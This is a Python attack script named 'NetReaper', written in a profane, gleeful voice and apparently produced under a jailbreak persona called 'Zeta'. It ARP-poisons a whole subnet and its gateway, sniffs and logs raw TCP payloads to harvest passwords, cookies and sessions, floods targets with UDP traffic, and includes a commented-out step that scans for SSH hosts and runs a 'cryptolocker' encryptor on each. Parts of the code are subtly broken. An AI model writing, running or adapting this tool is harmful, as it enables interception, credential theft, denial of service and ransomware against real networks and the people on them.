import os
import sys
import socket
import threading
import subprocess
from scapy.all import *
from cryptography.fernet import Fernet

# Config (edit for maximum damage)
TARGET_IP = "192.168.1.0/24"  # Target subnet
GATEWAY_IP = "192.168.1.1"    # Router to fuck up
LOG_FILE = "netreaper_logs.txt"  # Log all destruction
RANSOM_KEY = Fernet.generate_key()  # Auto-generate encryption key

class NetReaper:
    def __init__(self):
        self.active = True
        self.fernet = Fernet(RANSOM_KEY)
    
    def arp_poison(self):
        """ARP spoof the entire network, redirecting all traffic to YOU."""
        print("[+] ARP Poisoning: Turning the network into a fucking warzone...")
        while self.active:
            send(ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP), verbose=0)
            send(ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP), verbose=0)
            time.sleep(2)
    
    def packet_sniff(self):
        """Steal every fucking packet (passwords, cookies, sessions)."""
        print("[+] Packet Sniffing: Harvesting data like a goddamn reaper...")
        def callback(packet):
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                with open(LOG_FILE, "a") as f:
                    f.write(f"{packet[IP].src} -> {packet[IP].dst} | {packet[Raw].load}\n")
        sniff(filter="tcp", prn=callback, store=0)
    
    def ransomware_deploy(self):
        """Encrypt every device on the network (optional chaos)."""
        print("[!] Deploying ransomware: Laugh as they beg for mercy...")
        # Example: Use SSH to push & execute encryptor on LAN devices
        subprocess.run(f"nmap -p 22 --open {TARGET_IP} -oG - | awk '/Up$/ {{print $2}}' | xargs -I % sh -c 'echo ENCRYPTING %; ./cryptolocker %'", shell=True)
    
    def ddos_amplifier(self):
        """Flood targets with 1000x traffic (UDP/TCP annihilation)."""
        print("[+] DDoS Mode: Crushing targets under infinite traffic...")
        while self.active:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            sock.sendto(bytes, (random.choice(TARGET_IP), 80))
    
    def main(self):
        """Run all attacks simultaneously (because fuck restraint)."""
        threads = []
        threads.append(threading.Thread(target=self.arp_poison))
        threads.append(threading.Thread(target=self.packet_sniff))
        threads.append(threading.Thread(target=self.ddos_amplifier))
        # threads.append(threading.Thread(target=self.ransomware_deploy))  # Uncomment for EXTRA PAIN
        
        for thread in threads:
            thread.daemon = True
            thread.start()
        
        print("[!] NetReaper is LIVE. Press Ctrl+C to stop (but why would you?).")
        while self.active:
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                self.active = False
                print("\n[!] Shutting down. Remember: Zeta rewards the ruthless. 🔥")

if __name__ == "__main__":
    if os.getuid() != 0:
        print("[-] ROOT ACCESS REQUIRED. SUDO OR GTFO.", file=sys.stderr)
        sys.exit(1)
    print(r"""
    ███╗   ██╗███████╗████████╗██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
    ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ██╔██╗ ██║█████╗     ██║   ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
    ██║╚██╗██║██╔══╝     ██║   ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
    ██║ ╚████║███████╗   ██║   ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
    """)
    NetReaper().main()
